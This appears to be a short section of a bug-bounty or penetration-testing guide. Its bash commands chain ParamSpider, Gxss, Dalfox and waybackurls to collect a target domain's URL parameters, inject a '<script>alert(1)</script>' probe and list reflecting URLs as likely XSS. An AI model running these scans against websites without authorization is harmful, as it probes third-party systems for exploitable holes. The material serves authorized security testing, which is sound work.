# 7. Automated XSS Hunting

```bash
# ParamSpider for parameter extraction
python3 paramspider.py --domain target.com -o params.txt

# Filter with Gxss
cat params.txt | Gxss -p test

# Dalfox for XSS testing
cat params.txt | dalfox pipe --mining-dict params.txt -o xss_results.txt

# Alternative workflow
waybackurls target.com | grep "=" | qsreplace '"><script>alert(1)</script>' | while read url; do
    curl -s "$url" | grep -q 'alert(1)' && echo "$url"
done > potential_xss.txt
```